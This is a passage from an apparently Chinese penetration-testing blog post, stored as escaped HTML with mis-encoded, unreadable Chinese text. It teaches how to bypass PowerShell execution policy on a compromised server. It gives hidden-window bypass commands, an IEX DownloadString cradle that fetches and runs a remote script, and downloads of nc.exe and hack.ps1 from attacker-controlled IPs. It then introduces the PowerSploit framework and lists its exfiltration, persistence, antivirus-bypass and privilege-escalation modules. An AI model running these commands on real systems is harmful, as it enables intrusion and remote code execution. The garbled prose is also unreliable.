&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;æ˜¯&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¦&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;æŒ‚èµ·&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[?]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¸®åŠ©&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;é»˜è®¤å€¼ä¸º&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå†é‡æ–°æ‰§è¡Œä¸‹åˆšæ‰çš„è„šæœ¬å³å¯æ­£å¸¸è¿è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Hello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç»•æ‰§è¡Œç­–ç•¥&#34;&gt;ç»•æ‰§è¡Œç­–ç•¥&lt;/h3&gt;
&lt;p&gt;åœ¨æˆ‘ä»¬è·å–åˆ°æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„æ—¶å€™æ˜¯æ²¡æœ‰æƒé™å»æ›´æ”¹æ‰§è¡Œç­–ç•¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€äº›æŠ€å·§å»å¦‚ä½•ç»•è¿‡è„šæœ¬æ‰§è¡Œçš„ç­–ç•¥ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç»•è¿‡æœ¬åœ°æƒé™æ‰§è¡Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;æœ¬åœ°éšè—ç»•è¿‡æƒé™æ‰§è¡Œè„šæœ¬&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-NoLogo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-NonInteractive&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-NoProfile&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-WindowStyle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hidden&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;ç”¨IEXä¸‹è½½è¿œç¨‹PS1è„šæœ¬ç»•è¿‡æƒé™æ‰§è¡Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Bypass-WindowStyle&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Hidden-NoProfile&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Nonl&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-ObjectNet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxx.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Parameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;powershell ä¸‹è½½è¿œç¨‹æ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Win 7 PowerShell WebClientï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.0.0.10/nc.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nc.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Win 8åŠæ›´é«˜ç‰ˆæœ¬PowerShell Invoke-WebRequest (wget)ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/nc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-outfile&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;nc.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-WebRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Uri&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1/hack.ps1&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-OutFile&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\1.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šå‘½ä»¤çš„å‚æ•°è¯´æ˜ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ExecutionPolicy Bypass : ç»•è¿‡æ‰§è¡Œå®‰å…¨ç­–ç•¥ï¼Œè¿™ä¸ªå‚æ•°éå¸¸é‡è¦ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒPowerShellçš„å®‰å…¨ç­–ç•¥è§„å®šäº†PowerShellä¸å…è®¸è¿è¡Œå‘½ä»¤å’Œæ–‡ä»¶ã€‚é€šè¿‡è®¾ç½®è¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥ç»•è¿‡ä»»æ„ä¸€ä¸ªå®‰å…¨è§„åˆ™ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒåŸºæœ¬æ¯ä¸€æ¬¡è¿è¡ŒPowerShellè„šæœ¬æ—¶éƒ½è¦ä½¿ç”¨è¿™ä¸ªå‚æ•°ã€‚&lt;/li&gt;
&lt;li&gt;WindowStyle Hidden ï¼š éšè—çª—å£&lt;/li&gt;
&lt;li&gt;NoLogo : å¯åŠ¨ä¸æ˜¾ç¤ºç‰ˆæƒæ ‡å¿—çš„PowerShell&lt;/li&gt;
&lt;li&gt;NonInteractive (-Nonl) : éäº¤äº’æ¨¡å¼ï¼ŒPowerShellä¸ä¸ºç”¨æˆ·æä¾›äº¤äº’çš„æç¤º&lt;/li&gt;
&lt;li&gt;NoProfile (-Nop): PowerShellæ§åˆ¶å°ä¸åŠ è½½å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;Noexit : æ‰§è¡Œåä¸é€€å‡ºShellã€‚è¿™åœ¨ä½¿ç”¨é”®ç›˜è®°å½•ç­‰è„šæœ¬æ—¶éå¸¸é‡è¦ã€‚&lt;/li&gt;
&lt;li&gt;Net.WebClientï¼šè¿™ä¸ªæ˜¯.Netçš„å†…å®¹äº†ï¼Œæ„æ€å°±æ˜¯åˆ›å»ºWebClientå¯¹è±¡ï¼Œç„¶ååˆ©ç”¨WebClientå¯¹è±¡é‡Œé¢çš„&lt;code&gt;DownloadString&lt;/code&gt;æ–¹æ³•è¿›è¡Œä¸‹è½½ï¼Œç›¸å…³çŸ¥è¯†å¯ä»¥æŸ¥é˜…&lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0&#34;&gt;net.webclient&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;IEXï¼šè¿™ä¸ªå¯¹åˆå­¦powershellçš„åŒå­¦ä»¬å¯èƒ½æœ‰ç‚¹é™Œç”Ÿï¼Œå…¶å®è¿™ä¸ªå°±æ˜¯&lt;code&gt;Invoke-Expression&lt;/code&gt;çš„åˆ«åæŠŠä¸Šé¢çš„IEXæ¢æˆInvoke-Expressionæ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œå¥½æ¯”å¦‚shellä¸­çš„aliasï¼Œè·Ÿä¸Šé¢çš„&lt;code&gt;Net.WebClient&lt;/code&gt;ç»„åˆèµ·æ¥çš„åŠŸèƒ½å°±æ˜¯ä¸‹è½½å­—ç¬¦ä¸²ç„¶åæ‰§è¡Œã€‚&lt;code&gt;Invoke-Expression&lt;/code&gt;ç›¸å…³çš„çŸ¥è¯†å¯ä»¥åˆ°å¾®è½¯å®˜æ–¹å­¦ä¹ &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2&#34;&gt;Invoke-Expression&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PowerShellè„šæœ¬åœ¨é»˜è®¤æƒ…å†µä¸‹æ— æ³•ç›´æ¥è¿è¡Œï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨ä¸Šè¿°ä¸‰ç§æ–¹æ³•ç»•è¿‡å®‰å…¨ç­–ç•¥è¿è¡Œè„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ¥è®¾ç½®ä¸€ä¸‹æ‰§è¡Œæƒé™,è®¾ç½®æˆä¸èƒ½æ‰§è¡Œè„šæœ¬çš„æƒé™&lt;code&gt;restricted&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;set-executionpolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;restricted&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‰§è¡Œç­–ç•¥æ›´æ”¹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‰§è¡Œç­–ç•¥å¯å¸®åŠ©ä½ é˜²æ­¢æ‰§è¡Œä¸ä¿¡ä»»çš„è„šæœ¬&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;æ›´æ”¹æ‰§è¡Œç­–ç•¥å¯èƒ½ä¼šäº§ç”Ÿå®‰å…¨é£é™©&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ï¼Œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;å¦‚&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;go&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fwlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LinkID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;135170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ä¸­çš„&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;about_Execution_Policies&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¸®åŠ©ä¸»é¢˜æ‰€è¿°&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;æ˜¯å¦è¦æ›´æ”¹æ‰§è¡Œç­–ç•¥&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;?&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;æ˜¯&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å…¨æ˜¯&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¦&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å…¨å¦&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;æš‚åœ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[?]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;å¸®åŠ©&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;é»˜è®¤å€¼ä¸º&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â€&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä½¿ç”¨æˆ‘ä»¬çš„ç»•è¿‡æ‰§è¡Œçš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-File&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Hello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;powersploit&#34;&gt;PowerSploit&lt;/h1&gt;
&lt;p&gt;PowerSploitæ˜¯ä¸€æ¬¾åŸºäºPowerShellçš„åæ¸—é€ï¼ˆPost-Exploitionï¼‰æ¡†æ¶è½¯ä»¶ï¼ŒåŒ…å«å¾ˆå¤šPowerShellæ”»å‡»è„šæœ¬ï¼Œå®ƒä»¬ä¸»è¦ç”¨äºæ¸—é€ä¸­çš„ä¿¡æ¯ä¾¦æŸ¥ã€æƒé™æå‡ã€æƒé™ç»´æŒã€‚å…¶GitHubåœ°å€ä¸ºï¼šhttps://github.com/PowerShellMafia/PowerSploit&lt;/p&gt;
&lt;h2 id=&#34;å®‰è£…&#34;&gt;å®‰è£…&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬æŠŠæ•´ä¸ªæ–‡ä»¶ä»GitHubä¸Šä¸‹è½½ä¸‹æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ git clone https://github.com/PowerShellMafia/PowerSploit.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“ä¸­æœ‰å¾ˆå¤šæ¨¡å—ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows/PowerSploit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ tree -d -L &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ AntivirusBypass  //å‘ç°æ€æ¯’è½¯ä»¶çš„æŸ¥æ€ç‰¹å¾
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ CodeExecution    //åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä»£ç 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ docs             //æ–‡æ¡£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ Exfiltration    //ç›®æ ‡ä¸»æœºä¸Šçš„ä¿¡æ¯æœé›†å·¥å…·
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ Mayhem          //è“å±ç­‰ç ´åæ€§è„šæœ¬
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ Persistence     //åé—¨è„šæœ¬ï¼ˆæŒä¹…æ€§æ§åˆ¶ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ Privesc         //ææƒè„šæœ¬
